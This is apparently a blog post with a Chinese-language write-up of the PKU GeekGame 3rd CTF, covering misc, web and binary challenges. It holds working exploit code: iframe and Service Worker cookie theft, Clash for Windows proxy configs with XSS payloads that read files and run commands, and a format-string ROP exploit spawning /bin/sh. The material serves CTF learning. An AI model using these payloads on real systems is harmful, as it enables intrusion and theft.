<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1,user-scalable=no"><meta name="renderer" content="webkit"><meta name="color-scheme" content="dark light"><meta name="author" content="Chengke"><meta name="description" content=""><meta name="keywords" content=""><title>Write-up for GeekGame 3rd</title><link rel="icon" type="image/x-icon" href="/images/favicon.ico"><link rel="stylesheet" href="//at.alicdn.com/t/font_3242539_utq6ykfq7z.css"><link rel="stylesheet" light-src="https://cdn.staticfile.org/highlight.js/11.5.0/styles/default.min.css" dark-src="https://cdn.staticfile.org/highlight.js/11.5.0/styles/tokyo-night-dark.min.css"><link rel="stylesheet" href="https://fonts.font.im/css?family=Noto+Serif" as="font"><link href="//cdn.bootcdn.net/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet"><link href="/style/index.css" rel="stylesheet"><meta name="generator" content="Hexo 7.0.0"></head><body><header class="page-header"><nav><ul class="router-list"><li class="nav-item"><a href="/">Home</a></li><li class="nav-item"><a href="/archives/">Archive</a></li><li class="nav-item"><a href="/friends">Friends</a></li><li class="nav-item"><a href="/about">About</a></li><!--li.nav-item 
  a(href='/atom.xml') RSS--></ul><div class="mode-switch"><span class="iconfont icon-DarkTheme"></span></div></nav></header><main><section class="main-content"><section class="post-page"><div class="title-bar"><h1>Write-up for GeekGame 3rd</h1><div class="post-info"><span>2023-10-19 20:58:02</span><span class="tags"><a href="/tags/%E5%AE%9E%E9%AA%8C/">#实验</a></span></div></div><article> <div class="content"><p>你说的对，但是《PKU GeekGame》是由北京大学计算中心自主研发的一道全新开放世界 CTF 比赛。后面忘了……</p>
<p>今年比赛梗密度一如既往的高， 题目一如既往的有趣。通过这此比赛也学习到了不少新知识，包括二维码的编码方式，gzip 的编码方式，Service Worker 的安全性。感谢主办方的辛勤组织和付出，期待 GeekGame 越来越好。</p>
<p>这次比赛收获遥遥领先<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>一台！外加两个“解题先锋奖”。</p>
<h2 id="学习到的新技能"><a class="markdownIt-Anchor" href="#学习到的新技能"></a> 学习到的新技能</h2>
<p>这已经是我第三次参加 GeekGame 了。非常喜欢有这样的交流平台，因为每次参考都能从别人的解答中学习到新技能、新工具。这些对优化平时的工作流有极大的帮助，正所谓“工欲善其事，必先利其器”。这里记录一下新学习的内容。</p>
<h3 id="使用-zmodem-传输文件"><a class="markdownIt-Anchor" href="#使用-zmodem-传输文件"></a> 使用 ZMODEM 传输文件</h3>
<p>SCP 和 rsync 之类的需要直接或者通过代理/端口转发访问机器的工具都不能用来在办公网和生产环境机器之间传输文件<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>。如果要实现本地和终端之前传输，可以使用 ZMODEM 协议。支持该协议的常用包是 lrzsz，可惜的是目前很多终端软件没有实现或者没有正确实现该协议。目前我找到了一个替代方案 <a target="_blank" rel="noopener" href="https://trzsz.github.io/ssh">trzsz</a>，该方案为了解决终端软件没有实现 ZMODEM 协议的问题，独自实现了该协议，并写了一个 SSH wrapper 叫 <code>tssh</code>。</p>
<h3 id="使用-virustotal-索引二进制文件"><a class="markdownIt-Anchor" href="#使用-virustotal-索引二进制文件"></a> 使用 VirusTotal 索引二进制文件</h3>
<p><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/upload">VirusTotal</a> 是一个在线病毒扫描工具。因为它会记录所有用户上传的历史文件，我们可以用它来确定某个文件是官方发布的，还是经过出题人修改的。</p>
<hr />
<p>以下是 writeup 的正文。其中包括一些补做的内容。题目在这个链接<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>。</p>
<h2 id="tutorial"><a class="markdownIt-Anchor" href="#tutorial"></a> Tutorial</h2>
<h3 id="一眼盯帧"><a class="markdownIt-Anchor" href="#一眼盯帧"></a> 一眼盯帧</h3>
<p>题目文件是一张以 GIF 格式呈现的动画，每一帧都包含一个字符。问题的主要挑战在于，每一帧的播放时间太短，难以清晰看出每一帧上的内容。为了应对这一挑战，我在网络上找了一个能延长每一帧的播放时间的工具，这样就能观察每一帧的内容，将每一帧的内容拼接起来，就能得到字符串 <code>synt&#123;rawblgurtrrxtnzr&#125;</code> 。简单的观察可以发现使用了凯撒加密，只需进行枚举解密即可轻松获得答案。</p>
<h3 id="小北问答"><a class="markdownIt-Anchor" href="#小北问答"></a> 小北问答</h3>
<p>问题1：在北京大学（校级）高性能计算平台中，什么命令可以提交一个非交互式任务？</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Kangyucheng/article/details/104858780">直接搜一下原问题就能得到答案</a>。</p>
<p>问题2：根据 GPL 许可证的要求，基于 Linux 二次开发的操作系统内核必须开源。例如小米公司开源了 Redmi K60 Ultra 手机的内核。其内核版本号是？</p>
<p>找到<a target="_blank" rel="noopener" href="https://github.com/MiCode/Xiaomi_Kernel_OpenSource/blob/corot-t-oss/Makefile">其开源代码</a>即可。</p>
<p>问题3：每款苹果产品都有一个内部的识别名称（Identifier），例如初代 iPhone 是 iPhone1,1。那么 Apple Watch Series 8（蜂窝版本，41mm 尺寸）是什么？</p>
<p>在这个<a target="_blank" rel="noopener" href="https://www.gsmarena.com/apple_watch_series_8-11866.php">移动设备网上搜索一下</a>，这里有一个小坑：代码编号的首字母要大写。</p>
<p>问题4：本届 PKU GeekGame 的比赛平台会禁止选手昵称中包含某些特殊字符。截止到 2023 年 10 月 1 日，共禁止了多少个字符？（提示：本题答案与 Python 版本有关，以平台实际运行情况为准）</p>
<p>查看<a target="_blank" rel="noopener" href="https://github.com/PKU-GeekGame/gs-backend/blob/ba1de3496eb435e5bcc6c18a83f1cf1ed726fa24/src/store/user_profile_store.py#L54-L61">源代码</a>并打印出禁用的 emoji 图标的数量。</p>
<p>问题5：在 2011 年 1 月，Bilibili 游戏区下共有哪些子分区？（按网站显示顺序，以半角逗号分隔）</p>
<p>首先在维基百科看到2011年哔哩哔哩使用的网络域名是 <code>bilibili.us</code>。然后在web archive上查看2011年1月游戏分区主页。</p>
<p>问题6: 这个照片中出现了一个大型建筑物，它的官方网站的域名是什么？（照片中部分信息已被有意遮挡，请注意检查答案格式）</p>
<p>使用谷歌搜图，即可以知道该大型建筑物是卢森堡音乐厅。</p>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> MISC</h2>
<h3 id="z-公司的服务器"><a class="markdownIt-Anchor" href="#z-公司的服务器"></a> Z 公司的服务器</h3>
<p>Flag1: 重放一下 pcap 发出的数据即可得到 flag1。</p>
<p>Flag2: 当时发现 payload 里面有校验码，找到了 <a target="_blank" rel="noopener" href="https://gallium.inria.fr/~doligez/zmodem/zmodem.txt">zmodem 的标准</a>并尝试去除多余的校验码字符，但是没读明白。</p>
<p>学习了一下<a target="_blank" rel="noopener" href="https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/players_writeup/1721#z-%E5%85%AC%E5%8F%B8%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8">其他选手的解法</a>，其实可以直接调库完成格式的转换。</p>
<h3 id="猫咪状态监视器"><a class="markdownIt-Anchor" href="#猫咪状态监视器"></a> 猫咪状态监视器</h3>
<p>当时看到<code>LIST</code>命令没有任何输出，很困惑，后来就没看这题了。赛后看了一下，这个工具没有对参数进行检查，可以利用路径穿越的漏洞。</p>
<h3 id="基本功"><a class="markdownIt-Anchor" href="#基本功"></a> 基本功</h3>
<p>Flag1: 根据 <a target="_blank" rel="noopener" href="https://github.com/kimci86/bkcrack">bkcrack</a> 中的教程进行明文攻击。注意到压缩包里面有一个 Chrome 的安装文件。 这里的问题是我们不知道安装文件的版本，幸运的是，我们可以知道这个安装文件的文件大小。我们可以枚举所有版本，然后根据文件大小确定安装文件。</p>
<p>Flag2: 同样是进行明文攻击。观察到题目给出的文件是一个 pcapng 格式的文件。根据<a target="_blank" rel="noopener" href="https://pcapng.com/">文件的格式内容</a>，我们可以知道，第9个到第24个字节的内容。根据已知的字节就可以使用明文攻击了。</p>
<h3 id="dark-room"><a class="markdownIt-Anchor" href="#dark-room"></a> Dark Room</h3>
<p>Flag1: 根据游戏源代码，我们可以知道最优解在结束的时候只有90分，然而，游戏要求我们要达到117分才能通关。观察到help指令每次有20%的概率能够增加10分。那么我们可以不断的重复游戏，直到 help 成功 3 次获得达到额外的30分就能通关游戏了。由于每次只有20%的概率能够加10分，我们需要重复大概125次游戏。</p>
<p>Flag2: 进入房间后发现输入字符串，能够暴露出部分源代码。 阅读源代码，发现每次如果最低位是1，需要生成两个巨大的质数。这个生成质数的过程非常消耗时间。所以我们可以根据程序的反应时间来判断最低位是0还是1。不断的重复这个过程，我们就能得到整个数字。通过数字转字节数组，就能得到最终的答案。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">binary_result = []</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5000</span>):</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        io.sendline(<span class="string">b&#x27;1&#x27;</span> * <span class="number">50</span>)</span><br><span class="line">        response = io.recvuntil(<span class="string">b&#x27;give me a number&#x27;</span>, timeout=<span class="number">3</span>)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        elapsed_time = end_time - start_time</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> elapsed_time &lt; <span class="number">0.3</span>:</span><br><span class="line">            binary_result.append(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(i, elapsed_time)</span><br><span class="line">        <span class="keyword">elif</span> elapsed_time &lt; <span class="number">2</span>:</span><br><span class="line">            binary_result.append(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(i, elapsed_time)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;An error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">result_string = <span class="string">&#x27;&#x27;</span>.join(binary_result)  <span class="comment"># Combine the binary results into a single string</span></span><br></pre></td></tr></table></figure>
<h3 id="麦恩库拉夫特"><a class="markdownIt-Anchor" href="#麦恩库拉夫特"></a> 麦恩·库拉夫特</h3>
<p>这是一题基 Minecraft 的题目。因为不想折腾，没有下载这个游戏。题目也没有看。赛后看了一下解答，感觉需要对游戏里的游戏特性（红石电路，命令方块）有相当了解才容易做出这题。</p>
<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
<h3 id="emoji-wordle"><a class="markdownIt-Anchor" href="#emoji-wordle"></a> Emoji Wordle</h3>
<p>Flag1: 枚举每个位置放哪个 emoji 是正确的。</p>
<p>Flag2: 解码 session 里面的 JWT token。</p>
<p>Flag3: 当时没做出来，当时以为要伪造 JWT。正确做法是类似重放攻击，不断重放在有效期内的 JWT token 就可以进行很多次的尝试。</p>
<h3 id="第三新xss"><a class="markdownIt-Anchor" href="#第三新xss"></a> 第三新XSS</h3>
<p>很喜欢这题，和很多大学给每个老师分配一个路径的使用场景很类似。</p>
<p>Flag1: 在页面中新建一个 iframe，并在其中访问受害者页面。然后直接读取我们想要的cookie<sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup>。官方解答还提到，如果通过 <code>X-Frame-Options</code> 禁用了 iframe，使用 <code>window.open</code> 依然可以绕过。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://&lt;出于安全考虑隐去&gt;.geekgame.pku.edu.cn/admin&quot;</span> <span class="attr">sandbox</span>=<span class="string">&quot;allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> frame = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> doc = <span class="variable language_">document</span>;</span></span><br><span class="line"><span class="language-javascript">    frame.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        doc.<span class="property">title</span> = frame.<span class="property">contentWindow</span>.<span class="property">window</span>.<span class="property">document</span>.<span class="property">cookie</span></span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Flag2: 没做出来。需要用到 Service Worker。</p>
<p>注册：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">async</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">await</span> navigator.<span class="property">serviceWorker</span>.<span class="title function_">register</span>(<span class="string">&#x27;/flag2_b/sw.js&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">scope</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
<p>Service Worker 代码:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">self.<span class="title function_">addEventListener</span>(<span class="string">&#x27;fetch&#x27;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;fetch&#x27;</span>, event.<span class="property">request</span>.<span class="property">url</span>);</span><br><span class="line">    <span class="keyword">if</span>(event.<span class="property">request</span>.<span class="property">url</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;/admin/&#x27;</span>)!==-<span class="number">1</span>) &#123;</span><br><span class="line">        event.<span class="title function_">respondWith</span>(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">                <span class="string">&#x27;&lt;script&gt;setInterval(()=&gt;&#123;document.title=&quot;got: &quot;+document.cookie&#125;, 100)&lt;/script&gt;&#x27;</span>,</span><br><span class="line">                &#123; <span class="attr">headers</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html&#x27;</span>&#125; &#125;</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="简单的打字稿"><a class="markdownIt-Anchor" href="#简单的打字稿"></a> 简单的打字稿</h3>
<p>Flag1: 学习<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/454968751">教程</a>。用 <code>StringToArrray</code> 拆分 flag 1。</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">StringToArrray</span>&lt;T <span class="keyword">extends</span> <span class="built_in">string</span>&gt; = T <span class="keyword">extends</span> <span class="string">`<span class="subst">$&#123;infer L&#125;</span><span class="subst">$&#123;infer R&#125;</span>`</span> ? [L, ...<span class="title class_">StringToArrray</span>&lt;R&gt;] : [];</span><br></pre></td></tr></table></figure>
<p>Flag2: 用教程里的 <code>LastOfUnion</code> 取出 <code>type flag2 = object | &#123; ... &#125;</code> 中的 <code>&#123; ... &#125;</code>，再用 extends 和 infer 组合得到 flag2。</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">UnionToIntersection</span>&lt;T&gt; = (T <span class="keyword">extends</span> <span class="built_in">any</span> ? <span class="function">(<span class="params">x: T</span>) =&gt;</span> <span class="built_in">void</span> : <span class="built_in">never</span>) <span class="keyword">extends</span> (</span><br><span class="line">  <span class="attr">x</span>: infer R</span><br><span class="line">) =&gt; <span class="built_in">void</span></span><br><span class="line">  ? R</span><br><span class="line">  : <span class="built_in">never</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">LastOfUnion</span>&lt;T&gt; = <span class="title class_">UnionToIntersection</span>&lt;</span><br><span class="line">  T <span class="keyword">extends</span> <span class="built_in">any</span> ? <span class="function">(<span class="params">x: T</span>) =&gt;</span> <span class="built_in">void</span> : <span class="built_in">never</span></span><br><span class="line">&gt; <span class="keyword">extends</span> (<span class="attr">x</span>: infer L) =&gt; <span class="built_in">void</span></span><br><span class="line">  ? L</span><br><span class="line">  : <span class="built_in">never</span>;</span><br></pre></td></tr></table></figure>
<h3 id="逝界计划"><a class="markdownIt-Anchor" href="#逝界计划"></a> 逝界计划</h3>
<p>没做出来。官方解答是用 nmap 进行文件读写： <code>-iL /flag.txt -oN /media/log.txt.jpg</code>。官方解答还提到实现 RCE 的方法。</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">-iL &lt;inputfilename&gt;: <span class="keyword">Input</span> <span class="keyword">from</span> <span class="keyword">list</span> of hosts/networks</span><br><span class="line">-<span class="keyword">oN</span>/-oX/-oS/-oG &lt;<span class="keyword">file</span>&gt;: <span class="keyword">Output</span> scan <span class="keyword">in</span> normal, XML, s|&lt;rIpt kIddi3,</span><br><span class="line">     <span class="keyword">and</span> Grepable <span class="keyword">format</span>, respectively, to the given <span class="keyword">filename</span>.</span><br></pre></td></tr></table></figure>
<h3 id="非法所得"><a class="markdownIt-Anchor" href="#非法所得"></a> 非法所得</h3>
<p>Flag1: 用 Flag3 的 RCE 方法读取 Flag。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">proxies:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">a&lt;img/id=&quot;X&quot;/src=&quot;1&quot;/onerror=eval(`document.getElementById(&#x27;X&#x27;).alt=require(&#x27;fs&#x27;).readFileSync(&#x27;/app/profiles/flag.yml&#x27;,&#x27;utf-8&#x27;).substring(86,116)`);&gt;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">socks5</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">    <span class="attr">port:</span> <span class="string">&quot;8088&quot;</span></span><br><span class="line">    <span class="attr">skip-cert-verify:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">proxy-groups:</span></span><br><span class="line">  <span class="bullet">-</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">Hello</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">a&lt;img/id=&quot;X&quot;/src=&quot;1&quot;/onerror=eval(`document.getElementById(&#x27;X&#x27;).alt=require(&#x27;fs&#x27;).readFileSync(&#x27;/app/profiles/flag.yml&#x27;,&#x27;utf-8&#x27;).substring(86,116)`);&gt;</span></span><br></pre></td></tr></table></figure>
<p>Flag2: 买了一台的阿里服务器，上面放着用于取 flag 的网页。然后修改代理服务器的 dns 配置，把原神官网域名指向之前我们部署的服务器 IP。</p>
<p>Flag3: 在 Github 上找到 <a target="_blank" rel="noopener" href="https://github.com/Fndroid/clash_for_windows_pkg/issues/2710">POC 代码</a> ，稍微修改一下即可实现 RCE。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">proxies:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">a&lt;img/id=&quot;X&quot;/src=&quot;1&quot;/onerror=eval(`document.getElementById(&#x27;X&#x27;).alt=require(&#x27;child_process&#x27;).execSync(&#x27;/app/readflag&#x27;)`);&gt;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">socks5</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">    <span class="attr">port:</span> <span class="string">&quot;8088&quot;</span></span><br><span class="line">    <span class="attr">skip-cert-verify:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">proxy-groups:</span></span><br><span class="line">  <span class="bullet">-</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">Hello</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">a&lt;img/id=&quot;X&quot;/src=&quot;1&quot;/onerror=eval(`document.getElementById(&#x27;X&#x27;).alt=require(&#x27;child_process&#x27;).execSync(&#x27;/app/readflag&#x27;)`);&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="binary"><a class="markdownIt-Anchor" href="#binary"></a> Binary</h2>
<h3 id="汉化绿色版免费下载"><a class="markdownIt-Anchor" href="#汉化绿色版免费下载"></a> 汉化绿色版免费下载</h3>
<p>Flag1: 挂 IDA 在内存中搜索 flag 即可。</p>
<p>Flag2: 找了很久没有找到能够解压 XP3 格式文件的软件，但是找到了能<a target="_blank" rel="noopener" href="https://github.com/arcusmaximus/KirikiriTools">解压存档的软件</a> 。通过观察存档文件，我们可以得到两个信息。第一，我们输入的 flag 是被 hash 成一个数字的；第二，我们可以知道每个字母被输入了多少次。根据第一个信息并且通过多次的试玩，我们可以观察到 hash 算法是 <code>s = (13337 * s + 11 * inputchar) mod 19260817, inputchar('A') = 1, inputchar('E') = 2, ... inputchar('&#125;') = 6</code>。感觉这个方法非常依赖观察能力，应该不是标准解答。结合第二个信息，我们可以搜索所有可能的 flag 字符串，并检查他们的 hash 值是否和存档里的相同。</p>
<p>赛后看了一下解答，解答是用 <a target="_blank" rel="noopener" href="https://github.com/morkt/GARbro">GARbro</a> 这个工具进行解包操作的。</p>
<h3 id="初学-c-语言"><a class="markdownIt-Anchor" href="#初学-c-语言"></a> 初学 C 语言</h3>
<p>Flag1: 用 <code>%8$p%9$p%10$p...</code> 可以打印存放在栈上的答案。</p>
<p>Flag2: 比赛时没做出来。当时 syscall 的 rdi 参数写错了，没调试出来。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># The 6-th args in printf() is at rsp or rbp-0x4f0</span></span><br><span class="line"><span class="comment"># Ret address is at rbp+0x8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The ?-the args is rbp</span></span><br><span class="line"><span class="comment">#     ? = 6 + (0x4f0 / 8) = 164</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please input your instruction:\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;%164$p&#x27;</span>)</span><br><span class="line">rbp_address = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please input your instruction:\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;%165$p&#x27;</span>)</span><br><span class="line">ret_address = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak address</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;rbp_address=:x&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;ret_address=:x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_byte</span>(<span class="params">addr, b: <span class="built_in">int</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please input your instruction:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> b &gt; <span class="number">0</span>:</span><br><span class="line">        len_byte = <span class="built_in">len</span>(<span class="built_in">str</span>(b))</span><br><span class="line">        pad = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">7</span> - len_byte)</span><br><span class="line">        str_byte = <span class="built_in">str</span>(b).encode()</span><br><span class="line">        io.sendline(<span class="string">b&#x27;%&#x27;</span> + str_byte + <span class="string">b&#x27;c%36$hhn&#x27;</span> + pad + p64(addr))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(<span class="string">b&#x27;%35$hhna&#x27;</span> + p64(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_long</span>(<span class="params">addr, long</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;write <span class="subst">&#123;long:x&#125;</span> at <span class="subst">&#123;addr:x&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        c = long // <span class="number">256</span>**i % <span class="number">256</span></span><br><span class="line">        write_byte(addr + i, c)</span><br><span class="line"></span><br><span class="line">bin_sh_addr = rbp_address - <span class="number">0x450</span> - <span class="number">0x10</span></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="string">b&#x27;/bin/sh\00&#x27;</span>):</span><br><span class="line">    write_byte(bin_sh_addr + i, <span class="built_in">int</span>(c))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x7ffff7f393fd  --&gt;   0x00005a777 + 0x7FFFF7F2F000</span></span><br><span class="line"><span class="comment"># ret_address   --&gt; ?</span></span><br><span class="line"><span class="comment"># ? = ret_address - 0x7ffff7f393fd + 0x7FFFF7F2F000 + 0x00005a777</span></span><br><span class="line"><span class="comment"># = ret_address -41981 + 0x00005a777(gadget)</span></span><br><span class="line"></span><br><span class="line">base_address = rbp_address - <span class="number">0x7fffffffe470</span> + <span class="number">0x7fffffffe468</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;base_address=:x&#125;</span>&#x27;</span>)</span><br><span class="line">write_long(base_address + <span class="number">0x00</span>, ret_address -<span class="number">41981</span> + <span class="number">0x000005a777</span>)    <span class="comment">#  pop rax ; ret</span></span><br><span class="line">write_long(base_address + <span class="number">0x08</span>, <span class="number">59</span>)  <span class="comment"># sys_execv</span></span><br><span class="line">write_long(base_address + <span class="number">0x10</span>, ret_address -<span class="number">41981</span> + <span class="number">0x0000009cd2</span>)    <span class="comment">#  pop rdi ; ret</span></span><br><span class="line">write_long(base_address + <span class="number">0x18</span>, bin_sh_addr)  <span class="comment"># 0</span></span><br><span class="line">write_long(base_address + <span class="number">0x20</span>, ret_address -<span class="number">41981</span> + <span class="number">0x000001781e</span>)    <span class="comment">#  pop rsi ; ret</span></span><br><span class="line">write_long(base_address + <span class="number">0x28</span>, <span class="number">0</span>)  <span class="comment"># 0</span></span><br><span class="line">write_long(base_address + <span class="number">0x30</span>, ret_address -<span class="number">41981</span> + <span class="number">0x0000009bdf</span>)    <span class="comment">#  pop rdx ; ret</span></span><br><span class="line">write_long(base_address + <span class="number">0x38</span>, <span class="number">0</span>)  <span class="comment"># 0</span></span><br><span class="line">write_long(base_address + <span class="number">0x40</span>, ret_address -<span class="number">41981</span> + <span class="number">0x0000059512</span>)    <span class="comment">#  mov eax, eax ; syscall</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please input your instruction:\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;exit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="baby-stack"><a class="markdownIt-Anchor" href="#baby-stack"></a> Baby Stack</h3>
<p>Flag1: 没做出来。不是很明白提示中的 “integer overflow” 是什么，我看到汇编里用的是 <code>ja</code> 来判断输入字母串的长度的。<code>ja</code> 指令应该是比较无符号整数的，所以不太清楚怎么利用漏洞。</p>
<p>赛后看了，原来是当 <code>len=0</code> 时， <code>len-1</code> 判断会溢出，此时允许我们输入任意长的字符串。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">get_line</span><span class="params">(<span class="type">char</span> *buf, <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = len - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)result &lt;= i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v4 = &amp;buf[i];</span><br><span class="line">    result = read(<span class="number">0</span>, v4, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *v4 == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *v4 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
